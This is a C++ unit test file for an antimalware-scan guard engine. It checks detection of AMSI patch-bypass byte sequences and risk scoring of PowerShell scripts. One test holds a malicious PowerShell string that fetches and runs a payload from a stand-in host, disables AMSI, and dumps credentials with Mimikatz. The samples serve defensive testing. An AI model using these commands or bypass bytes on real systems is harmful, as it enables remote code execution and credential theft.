#include "gcad/engines/amsi_guard_engine.hpp"
#include <functional>

extern void register_test(const char* name, std::function<bool()> fn);

void register_amsi_guard_tests() {
    register_test("amsi_guard_name_and_lifecycle", [] {
        gcad::AmsiGuardEngine engine;
        if (engine.name() != "AMSI-Guard") return false;
        if (engine.running()) return false;
        if (engine.start() != gcad::ErrorCode::OK) return false;
        if (!engine.running()) return false;
        auto st = engine.status();
        if (st.name != "AMSI-Guard" || !st.running) return false;
        if (engine.stop() != gcad::ErrorCode::OK) return false;
        if (engine.running()) return false;
        return true;
    });

    register_test("amsi_guard_is_patch_bypass_detection", [] {
        // Direct RET
        const uint8_t patch_ret[] = {0xC3, 0x90, 0x90};
        if (!gcad::AmsiGuardEngine::is_patch_bypass(patch_ret, sizeof(patch_ret))) return false;

        // RET imm16
        const uint8_t patch_ret16[] = {0xC2, 0x18, 0x00};
        if (!gcad::AmsiGuardEngine::is_patch_bypass(patch_ret16, sizeof(patch_ret16))) return false;

        // mov eax, 0x80070057; ret
        const uint8_t patch_e_invalidarg[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
        if (!gcad::AmsiGuardEngine::is_patch_bypass(patch_e_invalidarg, sizeof(patch_e_invalidarg))) return false;

        // xor eax, eax; ret
        const uint8_t patch_xor_eax[] = {0x31, 0xC0, 0xC3};
        if (!gcad::AmsiGuardEngine::is_patch_bypass(patch_xor_eax, sizeof(patch_xor_eax))) return false;

        // Normal Windows x64 function prologue: mov [rsp+18h], rbx; push rdi
        const uint8_t clean_prologue[] = {0x48, 0x89, 0x5C, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, 0x48};
        if (gcad::AmsiGuardEngine::is_patch_bypass(clean_prologue, sizeof(clean_prologue))) return false;

        // Empty / null
        if (gcad::AmsiGuardEngine::is_patch_bypass(nullptr, 0)) return false;

        return true;
    });

    register_test("amsi_guard_scan_benign_script", [] {
        gcad::AmsiGuardEngine engine;
        auto res = engine.scan_script_buffer("Write-Host 'Hello from GCAD Diagnostics'; Get-Date;");
        return res.risk == gcad::ScriptRiskLevel::BENIGN && res.score == 0 && res.matched_indicators.empty();
    });

    register_test("amsi_guard_scan_suspicious_script", [] {
        gcad::AmsiGuardEngine engine;
        auto res = engine.scan_script_buffer("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command 'Get-Process'");
        return res.risk == gcad::ScriptRiskLevel::SUSPICIOUS && res.score >= 15;
    });

    register_test("amsi_guard_scan_malicious_script_triggers_threat", [] {
        gcad::AmsiGuardEngine engine;
        bool threat_received = false;
        gcad::ThreatEvent captured{};

        engine.on_threat([&](gcad::ThreatEvent ev) {
            threat_received = true;
            captured = std::move(ev);
        });

        auto res = engine.scan_script_buffer(
            "$client = New-Object Net.WebClient; "
            "IEX $client.DownloadString('http://evil.corp/payload.ps1'); "
            "[AmsiUtils]::amsiInitFailed = $true; "
            "Invoke-Mimikatz -DumpCreds"
        );

        if (res.risk != gcad::ScriptRiskLevel::MALICIOUS) return false;
        if (!threat_received) return false;
        if (captured.category != gcad::ThreatCategory::FILELESS_EXEC) return false;
        if (captured.level != gcad::ThreatLevel::HIGH) return false;
        return true;
    });
}
